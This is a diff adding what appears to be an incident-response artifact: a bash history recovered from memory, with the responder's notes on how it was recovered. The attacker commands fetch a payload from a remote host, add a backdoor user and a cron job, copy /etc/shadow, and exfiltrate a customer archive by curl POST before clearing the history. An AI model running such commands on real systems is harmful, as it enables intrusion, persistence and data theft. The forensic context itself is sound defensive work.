@@ -1,0 +1,46 @@
+# NOTE from IR responder at acquisition time (2026-05-14T02:57:33Z):
+# The on-disk ~deploy/.bash_history file was empty at acquisition. The
+# attacker ran `history -c && rm ~/.bash_history && exit` immediately
+# before disconnecting. The recovered commands below were extracted by
+# Volatility 3's `linux.bash` plugin against the memory image captured
+# at 03:05:00Z; the recovery is partial because the bash process exited
+# cleanly and the heap was partially reclaimed.
+#
+# The HISTTIMEFORMAT-style timestamps below were reconstructed by
+# correlating each recovered command against journal/auth.log entries
+# whose ProcessID matched the bash session. Times are best-effort UTC
+# to the nearest second.
+#1778726855
+id
+#1778726858
+whoami
+#1778726862
+hostname
+#1778726867
+ls -la /home
+#1778726874
+wget http://198.51.100.7/payload -O /tmp/x
+#1778726875
+chmod +x /tmp/x
+#1778726876
+mv /tmp/x /tmp/.x
+#1778726882
+useradd -m -s /bin/bash -u 1099 support
+#1778726894
+echo 'support:Crunch4ever!' | chpasswd
+#1778726913
+echo '*/5 * * * * /tmp/.x' | crontab -u support -
+#1778726941
+chattr +i /tmp/.x
+#1778726955
+cat /etc/shadow > /tmp/sh.out
+#1778726962
+tar czf /tmp/d.tar.gz /home/customers/
+#1778726980
+curl -X POST --data-binary @/tmp/d.tar.gz https://198.51.100.7:8443/ -k
+#1778726995
+rm -f /tmp/sh.out /tmp/d.tar.gz
+#1778727001
+history -c
+#1778727003
+rm ~/.bash_history
